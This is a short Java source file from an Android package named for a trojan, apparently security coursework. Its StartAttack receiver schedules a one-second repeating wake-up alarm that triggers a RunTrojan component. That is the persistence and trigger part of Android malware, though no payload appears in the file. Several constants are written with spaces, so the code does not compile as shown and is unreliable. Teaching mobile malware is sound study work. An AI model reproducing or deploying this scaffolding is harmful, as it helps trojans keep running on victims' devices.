package edu.uc.cs.androidsecurity.trojan;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.util.Calendar;

public class StartAttack extends BroadcastReceiver {
    int count = 0;
    Calendar cal = Calendar.getInstance();
    long TIME = 1000;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("StartAttack", "onReceive");
        AlarmManager service = (AlarmManager)context.getSystemService(Context.ALARM SERVICE);
        Intent i = new Intent(context, RunTrojan.class);
        //i.setAction("android.trojan.action.BC ACTION");
        PendingIntent pending = PendingIntent.getBroadcast(context, 0, i, PendingIntent.FLAG CANCEL CURRENT);
        service.setInexactRepeating(AlarmManager.RTC WAKEUP, cal.getTimeInMillis(), TIME, pending);
        Log.i("StartAttack", count++ +" times");
    }
}